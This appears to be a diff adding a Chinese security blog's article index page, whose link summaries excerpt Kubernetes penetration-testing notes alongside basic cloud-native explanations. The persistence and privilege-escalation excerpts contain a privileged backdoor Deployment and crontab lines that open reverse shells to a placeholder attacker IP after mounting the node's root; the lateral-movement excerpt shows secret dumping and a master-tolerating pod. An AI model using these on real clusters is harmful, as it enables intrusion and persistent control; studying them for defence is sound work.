+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-link" data-summary="K8s渗透-持久化 文章首发于track安全社区：K8s渗透入门从零到一
+持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权
+部署后门容器 在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）
+常见方法如下
+挂载目录 向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：K8s渗透-权限提升
+这里值得一提的是，我们可以使用这个配置：
+restartPolicy: Always 可以让pod在被关闭后重启
+使用k8s控制器部署后门容器 在前面 K8s渗透-执行 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：
+kind: Pod 这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：
+apiVersion: apps/v1 kind: Deployment metadata: name: test-rev spec: replicas: 1 selector: matchLabels: app: test-rev template: metadata: labels: app: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 指定yaml文件即可创建：
+">K8s渗透-持久化</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-link" data-summary="K8s渗透-权限提升 文章首发于track安全社区：K8s渗透入门从零到一
+一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。
+RBAC权限滥用 类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务
+部署静态pod 这个方法在我的k8s渗透-持久化的笔记中已经介绍过了，这里不再赘述
+利用容器不安全配置提权 即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别
+挂载目录逃逸 挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：Docker逃逸手法大全，这里提一个最简单的挂载根目录：
+比如我们创建恶意pod的时候，根目录挂载到了容器的/mnt目录，所以在获取了pod的shell后，我们可以通过查看pod的/mnt目录来访问查看node的根目录：
+接下来可以通过写定时任务来获取node的shell：
+echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;sh -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;vps的公网IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown &amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 注意，这里并没有直接使用sh -i &amp;amp;gt; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 2&amp;amp;gt;&amp;amp;amp;1，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持&amp;amp;gt;&amp;amp;amp;语法，上面的yaml文件中反弹shell的payload同理
+我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：
+这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作： 不过通过查阅资料发现原因可能和busybox的情况类似，对-i即交互参数支持不完整，那么我们可以尝试使用disown命令让我们反弹shell的进程不受父shell进程影响而exit：
+echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown&amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 此时我们就可以接收到反弹的shell并且不会断开了： 持久化挂载docker.sock 挂载docker socket逃逸同样在我写的 Docker逃逸手法大全 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：
+">K8s渗透-权限提升</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-link" data-summary="k8s渗透-横向移动 窃取凭证 kubeconfig凭证 kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 k8s渗透-初始访问 笔记中已经介绍了，这里不再说明
+secret对象 在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：
+kubeconfig get secrets -A 查看指定secret内容：
+kubectl --kubeconfig config -n [指定命名空间] get secret [secret名称] -o yaml 可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了
+集群内网渗透 K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段
+第三方组件风险 在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸
+简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群
+污点（taint）横向 这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限
+污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上
+其中污点有三种属性(效果)：
+NoSchedule：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。 PreferNoSchedule：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 PreferNoSchedule 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。 NoExecute：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，NoExecute 污点会导致 Pod 被终止并迁移到其他节点。 一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点
+比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：
+cat &amp;amp;gt; x.yaml &amp;amp;lt;&amp;amp;lt; EOF apiVersion: v1 kind: Pod metadata: name: control-master-x spec: tolerations: - key: &amp;amp;#34;node-role.kubernetes.io/master&amp;amp;#34; operator: &amp;amp;#34;Exists&amp;amp;#34; effect: &amp;amp;#34;NoSchedule&amp;amp;#34; containers: - name: control-master-x image: ubuntu:18.04 command: [&amp;amp;#34;/bin/sleep&amp;amp;#34;, &amp;amp;#34;3650d&amp;amp;#34;] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: Directory EOF 这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点
+">k8s渗透-横向移动</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/" class="article-link" data-summary="K8s渗透从0到1 文章首发于track安全社区：K8s渗透入门从零到一
+k8s基础 k8s架构 Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台
+k8s基本架构如下（图片的scheduler打错了，特此更正）： 从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点
+master节点主要有以下核心组件：
+etcd 保存了整个集群的状态 API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制 Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等 Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 node节点有以下核心组件：
+Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份
+Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
+Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
+pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
+fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。
+Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源
+这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器
+k8s特点 和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理
+k8s具有如下的特点：
+自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启
+弹性伸缩：容器数量的控制
+自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新
+服务发现和负载均衡：默认方案
+机密和配置管理：对敏感数据或其他进行配置管理
+存储编排：虚拟磁盘与物理磁盘
+批处理：批量任务实现
+k8s工作流程 kubectl 是 k8s 的客户端工具，可以使用命令行管理集群
+">K8s渗透入门从零到一</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/kubernetes%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="Kubernetes安全基础 文章首发于track安全社区：K8s渗透入门从零到一
+k8s基础 k8s架构 Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台
+k8s基本架构如下： 从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点
+master节点主要有以下核心组件：
+etcd 保存了整个集群的状态 API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制 Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等 Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 node节点有以下核心组件：
+Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份
+Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
+Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
+pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
+fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。
+Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源
+这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器
+k8s特点 和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理
+k8s具有如下的特点：
+自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启
+弹性伸缩：容器数量的控制
+自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新
+服务发现和负载均衡：默认方案
+机密和配置管理：对敏感数据或其他进行配置管理
+存储编排：虚拟磁盘与物理磁盘
+批处理：批量任务实现
+k8s工作流程 kubectl 是 k8s 的客户端工具，可以使用命令行管理集群
+">Kubernetes安全基础</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云：运行在云服务器上 原生：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟主机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟主机 虚拟主机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+注意：虚拟主机（Virtual Hosting）和虚拟机（Virtual Machine）是两个不同的概念，虚拟机是一个完整的虚拟化系统，包括操作系统、软件和硬件，可以在单个物理服务器上运行多个操作系统实例
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟主机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟主机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟主机、Docker和K8s集群环境</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+</ul>
+
+        
+    </div>
+
+    <div class="markdown-body">
+      
+      
+    </div>
+  </div>
+  <div class="sidebar-right">
+    
+  </div>
+</div>
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
